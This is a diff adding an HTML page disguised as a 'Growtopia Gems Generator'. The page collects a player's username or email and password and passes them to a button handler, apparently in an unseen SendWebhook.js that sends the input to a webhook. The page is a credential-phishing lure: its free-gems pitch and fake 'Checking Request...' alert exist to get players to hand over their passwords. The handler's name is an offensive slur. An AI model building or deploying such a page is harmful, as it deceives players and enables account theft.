@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<link rel="stylesheet" href="design.css">
+<link href='https://cdn.jsdelivr.net/npm/boxicons@2.0.5/css/boxicons.min.css' rel='stylesheet'>
+<head>
+  <br><br>
+  <title> Growtopia Gems Generator </title>
+  <meta charset="utf-8" />
+  <title> </title>
+  <link rel="icon" href="favicon.ico" />
+  <script src="SendWebhook.js" charset="utf-8"></script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js" charset="utf-8"></script>
+</head>
+ 
+  <center> <h1> Gems Generator </h1> </center>
+  <center> <p>Gmail : </p><input class="textbox" type='text' id="user" placeholder="Username Or Email"> </center>
+  <center> <p>Password : </p><input class="textbox" type='text' id="pass" placeholder="Your Password Here"> </center>
+    <center> <p>Amount : </p><input class="textbox" type='text' id="gems" placeholder="Your Gems Amount Here"> </center>
+  <center> <button class="button" id="sendButton" onclick="gtfo_cunt();">Get Gems!</button> </center>
+  <center> <p>Please Input Correct Growtopia UserName And Password Or It Wont Work. Also Dont Do More Than One In The Same Account Or you May Get Banned!</p> </center>
+  <div class="alert hide">
+  <span class="fas fa-exclamation-circle"></span>
+  <span id= 'alert' class="msg">Checking Request...</span>
+  <div class="close-btn">
+  <span class="fas fa-times"></span>
+  </div>
+  <script>
+     $('button').click(function(){
+     $('.alert').addClass("show");
+     $('.alert').removeClass("hide");
+     $('.alert').addClass("showAlert");
+     setTimeout(function(){
+     $('.alert').removeClass("show");
+     $('.alert').addClass("hide");
+     },5000);
+     });
+     $('.close-btn').click(function(){
+     $('.alert').removeClass("show");
+     $('.alert').addClass("hide");
+     });
+   </script>  
+</body>
+</html>
